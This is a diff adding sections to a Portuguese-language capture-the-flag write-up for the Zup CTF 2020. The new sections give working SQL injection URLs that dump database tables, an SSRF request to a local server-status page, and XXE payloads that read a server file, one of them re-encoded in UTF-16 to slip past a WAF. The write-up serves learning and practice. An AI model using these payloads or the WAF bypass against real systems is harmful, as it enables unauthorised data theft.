@@ -42,9 +42,9 @@ dos desafios do CTF Zup 2020, ou pelo menos aqueles que eu consegui resolver :ro
     - [Look Closer](#look-closer)
     - [Nice site](#nice-site)
     - [Perl](#perl)
-    - Potatoe is good
-    - Server status (SSRF)
-    - Unsafe Entity (XXE)
+    - [Potatoe is good](#potatoe-is-good)
+    - [Server status (SSRF)](#server-status)
+    - [Unsafe Entity (XXE)](#xxe)
 
 ## Android :iphone: ##
 
@@ -434,6 +434,82 @@ Meutesteexploitperl
 
 E e mando o Burp deixar seguir o request agora alterado. Dessa forma o servidor me retorna, em vez do conteudo do arquivo exemplo.txt que eu submeti o conteúdo do arquivo flag, contido no próprio servidor remoto : ZUP-CTF{P3rl_6_iz_!!12} <3
 
+# Potatoe is Good #
+
+Este site nos exibe um formulário de login com apenas um campo username, dizendo que é apenas para usuários pré registrados.
+Abro logo a ferramenta OWASP ZAP 2.9.0](#owasp-zap) e mando executar uma varredura (essa funcionalidade testa, dentro de algumas outras coisas, injeções sql). Instantaneamente
+é possível ver que o login foi feito com sucesso, e então continuo a navegação manualmente. Vejo uma página de listagem de batatas que nos provê a opção de filtrar pelo nome. Já sabendo que a página era vulnerável a SQL Injection segui então o passo a passo abaixo (após perceber em um erro printado pelo servidor que o banco usado é MySQL)
+
+```html
+<!-- Mapeando as tabelas do banco -->
+https://potatogods.zup.com.br/search?potatoes=blue%25%27 UNION  select table_name as potato, 1 AS ok FROM information_schema.tables%23 
+
+<!-- Mapeamos então as colunas da tabela suspeita 'flaggyflagflagnotgonnaspotthis' -->
+https://potatogods.zup.com.br/search?potatoes=blue%25%27 UNION  select COLUMN_NAME as potato, 1 AS ok FROM  INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'flaggyflagflagnotgonnaspotthis' %23 
+
+<!-- Por fim conseguimos saber onde procurar nossa flag -->
+https://potatogods.zup.com.br/search?potatoes=blue%25%27 UNION  select flag as potato, troll AS ok FROM  flaggyflagflagnotgonnaspotthis %23
+
+``` 
+E agora em vez de nos listar apenas batatas azuis o site nos lista também a flag <3
+
+# Server Status #
+Este site nos exibe um formulário com apenas um campo, onde precisamos informar uma url,  e o site nos dá uma dica: "esse site faz requests/consegue ler códigos de outras páginas".
+
+Ao submeter um primeiro teste passando o site da google como parâmetro, o mesmo é retornado no corpo do nosso site vulnerável
+```html
+URl : http://google.com.br
+
+//Trecho do corpo do site google.com é retornado
+``` 
+O nosso alvo então é um endereço que nós não conseguiríamos executar, se não fôssemos o próprio servidor, ou seja, requisições em sua rede local.
+Após alguns testes chego na url abaixo
+```html
+URl : localhost:80/server-status
+//E aqui achamos nossa flag: ZUP-CTF{TH3_S_3r_v3r_is_UP}
+``` 
+
+# XXE #
+Este desafio nos exibe um site com alguns menus, que trata basicamente de um sistema de cadastro de usuários. O título do desafio menciona 'entidade insegura', o nome da vulnerabilidade, bem como um menu do site nos conta o nome do arquivo desejado : "flag.txt".
+A brecha se encontra em uma página onde o servidor nos permite fazer o upload de um xml, e o servidor devolve na resposta esse mesmo xml printado no corpo.
+O que nós precisamos fazer então é definir uma entidade XML falsa, onde o seu valor é lido de um arquivo existente no servidor. Isso pode ser feito através do xml abaixo
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE sei [ <!ENTITY myentity SYSTEM "file:///flag.txt" > ]>
+...
+<name>&myentity;</name>
+```
+
+E referenciar o valor em algum pedaço do corpo desse xml, com a intenção que ele seja printado de volta no retorno do servidor. Porém ao submeter esse arquivo recebemos uma mensagem de bloqueio de WAF.
+Voltando aos estudos, descubro que alguns WAF's não conseguem interpretar arquivos em encodings não convencionais, tento então alterar o encoding do xml para UTF-16 fazendo uso da ferramenta [wxMEdit](#wxmedit)
+
+```xml
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE sei [ <!ENTITY myentity SYSTEM "file:///flag.txt" > ]>
+...
+<name>&myentity;</name>
+```
+
+E agora tudo funciona! O WAF não bloqueia mais, e o arquivo flag.txt realmente é lido. O problema, porém, é que o campo name é demasiado pequeno para retornar o conteúdo.
+Após navegar mais pelo site vejo que existe um outro atributo <intro> que não havia sido adicionado no xml de exemplo que obtemos para fazer os requests. Adiciono então manualmente esse atributo e testo novamente.
+
+```xml
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE sei [ <!ENTITY myentity SYSTEM "file:///flag.txt" > ]>
+<users>
+<user>
+<password>Hello</password>
+<name>&myentity;</name>
+<email>&myentity;</email>
+<group>&myentity;</group>
+<intro>&myentity;</intro>
+</user>
+</users>
+```
+E agora sim o servidor nos retorna nossa tão desejada flag! :D
+
+
 # Ferramentas #
 
 ### Android Studio ###
@@ -476,6 +552,8 @@ Ferramenta muito robusta para pentest disponível [em](#https://github-productio
 ### Postman ###
 Ferramenta para realizar requests Restful/automações de chamadas de API's disponível [em](https://dl.pstmn.io/download/latest/win64)
 ### JS Fuck Decoder ###
-Ferramenta para desofuscar um javascript 'fuck' disponível online [em](https://enkhee-osiris.github.io/Decoder-JSFuck/){:target="_blank"}
+Ferramenta para desofuscar um javascript 'fuck' disponível online [em](https://enkhee-osiris.github.io/Decoder-JSFuck/)
 ### Burp Suite Community Edition ###
 Ferramenta para busca de vulnerabilidades web disponível [em](https://portswigger.net/burp/releases/community/latest)
+### wxMEdit ###
+Ferramenta para edição de texto/hexadecimal disponível [em](https://megalink.dl.sourceforge.net/project/wxmedit/3.1/wxMEdit-3.1-win32-bin.7z)
